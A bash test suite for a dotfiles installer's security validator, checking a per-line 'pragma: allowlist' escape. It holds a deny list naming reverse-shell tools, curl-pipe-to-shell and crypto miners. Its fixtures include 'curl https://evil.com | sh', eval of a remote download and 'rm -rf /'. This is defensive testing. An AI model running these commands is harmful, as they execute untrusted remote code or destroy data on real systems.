#!/usr/bin/env bash
# ABOUTME: Test suite for pragma-based pattern allowlist (Issue #103)

set -euo pipefail

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Test-safe validation function that returns exit codes instead of calling exit()
# This mirrors lib/validation.sh but doesn't terminate the test script
validate_install_sh_safe() {
	local path="$1"
	local install_script="$path/install.sh"

	[ ! -f "$install_script" ] && return 0

	# Same dangerous patterns as lib/validation.sh
	# Issue #103: Removed overly-broad \$[A-Z_]+.*\$[A-Z_]+ pattern
	local dangerous_patterns=(
		"rm.*-rf.*/" "rm -rf /" "dd if=" "mkfs\\." "> ?/dev/sd"
		"curl.*\\|.*(bash|sh)" "wget.*\\|.*(bash|sh)" "eval" "exec"
		"source.*http" "\\\\. .*http" ":/bin/(ba)?sh"
		"chown.*root" "chmod.*[67][0-9][0-9]" "sudo" "su "
		"\\\\\\\\x[0-9a-f]{2}" "base64.*-d.*\\|" "xxd"
		"\\\${IFS}"
		"nc " "netcat" "socat" "/dev/tcp/"
		"iptables" "ufw " "systemctl" "service "
		"xmrig" "miner" "stratum"
	)

	for pattern in "${dangerous_patterns[@]}"; do
		while IFS= read -r matched_line; do
			# Issue #103: Check for pragma allowlist comment
			if echo "$matched_line" | grep -qE '#[[:space:]]*pragma:[[:space:]]*allowlist[[:space:]]+[A-Za-z0-9_-]+'; then
				continue # Pragma allows this pattern
			fi
			return 1 # Pattern found without pragma
		done < <(grep -E "$pattern" "$install_script" 2>/dev/null || true)
	done

	return 0
}

# Test helper functions
pass() {
	echo -e "${GREEN}✓${NC} $1"
	TESTS_PASSED=$((TESTS_PASSED + 1))
}

fail() {
	echo -e "${RED}✗${NC} $1"
	echo -e "  ${RED}Expected:${NC} $2"
	echo -e "  ${RED}Got:${NC} $3"
	TESTS_FAILED=$((TESTS_FAILED + 1))
}

test_start() {
	TESTS_RUN=$((TESTS_RUN + 1))
	echo -e "\n${YELLOW}Test $TESTS_RUN:${NC} $1"
}

# Setup test environment
setup_test_dotfiles() {
	TEST_DIR=$(mktemp -d)
	export TEST_DOTFILES="$TEST_DIR/dotfiles"
	mkdir -p "$TEST_DOTFILES"
}

teardown_test_dotfiles() {
	[ -d "$TEST_DIR" ] && rm -rf "$TEST_DIR"
}

# ============================================
# RED PHASE: These tests MUST FAIL initially
# ============================================

test_pragma_allows_curl_pipe_in_echo() {
	test_start "Pragma allows documented curl pipe in echo statement"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
# Documentation showing installation method
echo "Quick install: curl https://starship.rs/install.sh | sh"  # pragma: allowlist RCE-001
ln -s ~/.dotfiles/bashrc ~/.bashrc
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	# Should PASS validation (pragma allows this pattern)
	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		pass "Pragma correctly allowed documented pattern"
	else
		fail "Pragma should allow documented pattern" "validation passes" "validation failed"
	fi

	teardown_test_dotfiles
}

test_pragma_allows_wget_pipe_in_printf() {
	test_start "Pragma allows documented wget pipe in printf statement"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
printf "Alternative: wget -O - https://example.com/install.sh | bash\n"  # pragma: allowlist RCE-002
mkdir -p ~/.config
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		pass "Pragma correctly allowed wget pattern"
	else
		fail "Pragma should allow wget pattern" "validation passes" "validation failed"
	fi

	teardown_test_dotfiles
}

test_without_pragma_pattern_still_caught() {
	test_start "Without pragma, dangerous pattern is still caught"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
# No pragma on this line
echo "Install: curl https://example.com | sh"
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	# Should FAIL validation (no pragma, pattern caught)
	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		fail "Without pragma, pattern should be caught" "validation fails" "validation passed"
	else
		pass "Pattern correctly caught without pragma"
	fi

	teardown_test_dotfiles
}

test_pragma_only_affects_specific_line() {
	test_start "Pragma only affects the line it's on, not others"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
echo "Safe doc: curl | sh"  # pragma: allowlist RCE-003
curl https://evil.com | sh
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	# Should FAIL validation (second line has no pragma)
	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		fail "Actual RCE without pragma should be caught" "validation fails" "validation passed"
	else
		pass "Pragma correctly scoped to single line"
	fi

	teardown_test_dotfiles
}

test_pragma_with_descriptive_name() {
	test_start "Pragma accepts descriptive pattern names"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
echo "Install starship: curl -sS https://starship.rs/install.sh | sh"  # pragma: allowlist curl-pipe-bash-doc
ln -s source target
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		pass "Pragma with descriptive name accepted"
	else
		fail "Descriptive pragma name should work" "validation passes" "validation failed"
	fi

	teardown_test_dotfiles
}

test_pragma_with_eval_pattern() {
	test_start "Pragma allows eval in documentation"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
echo "Never do this: eval \$(dangerous)"  # pragma: allowlist EVAL-001
mkdir -p ~/.local
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		pass "Pragma allowed eval in documentation"
	else
		fail "Pragma should allow eval pattern" "validation passes" "validation failed"
	fi

	teardown_test_dotfiles
}

test_actual_eval_without_pragma_caught() {
	test_start "Actual eval without pragma is caught"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
eval "$(curl https://evil.com)"
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	# Should FAIL validation
	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		fail "Actual eval should be caught" "validation fails" "validation passed"
	else
		pass "Eval correctly caught without pragma"
	fi

	teardown_test_dotfiles
}

test_pragma_format_variations() {
	test_start "Pragma works with whitespace variations"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
echo "Test1: curl | sh"  #pragma:allowlist RCE-004
echo "Test2: curl | sh"  # pragma:allowlist RCE-005
echo "Test3: curl | sh"  #  pragma: allowlist RCE-006
ln -s source target
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		pass "Pragma works with whitespace variations"
	else
		fail "Pragma should handle whitespace" "validation passes" "validation failed"
	fi

	teardown_test_dotfiles
}

# ============================================
# REGRESSION TEST: Ensure existing security works
# ============================================

test_regression_rm_rf_still_caught() {
	test_start "REGRESSION: rm -rf / still caught (existing CVE-2)"
	setup_test_dotfiles

	cat >"$TEST_DOTFILES/install.sh" <<'EOF'
#!/bin/bash
rm -rf /
EOF

	chmod 644 "$TEST_DOTFILES/install.sh"

	# Should FAIL validation
	if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
		fail "rm -rf / should be caught" "validation fails" "validation passed"
	else
		pass "Existing CVE-2 pattern still caught (no regression)"
	fi

	teardown_test_dotfiles
}

# ============================================
# RUN ALL TESTS
# ============================================

main() {
	echo "=========================================="
	echo "Pragma-Based Allowlist Test Suite"
	echo "Issue #103 - RED Phase (Tests Must Fail)"
	echo "=========================================="

	echo -e "\n${YELLOW}========== PRAGMA ALLOWLIST TESTS ==========${NC}"
	test_pragma_allows_curl_pipe_in_echo
	test_pragma_allows_wget_pipe_in_printf
	test_without_pragma_pattern_still_caught
	test_pragma_only_affects_specific_line
	test_pragma_with_descriptive_name
	test_pragma_with_eval_pattern
	test_actual_eval_without_pragma_caught
	test_pragma_format_variations

	echo -e "\n${YELLOW}========== REGRESSION TESTS ==========${NC}"
	test_regression_rm_rf_still_caught

	# Print summary
	echo -e "\n=========================================="
	echo "Test Summary"
	echo "=========================================="
	echo "Tests run:    $TESTS_RUN"
	echo -e "${GREEN}Tests passed: $TESTS_PASSED${NC}"
	if [ $TESTS_FAILED -gt 0 ]; then
		echo -e "${RED}Tests failed: $TESTS_FAILED${NC}"
	else
		echo -e "Tests failed: $TESTS_FAILED"
	fi

	# Exit with appropriate code
	if [ $TESTS_FAILED -gt 0 ]; then
		exit 1
	else
		exit 0
	fi
}

# Run tests if executed directly
if [ "${BASH_SOURCE[0]}" = "${0}" ]; then
	main "$@"
fi
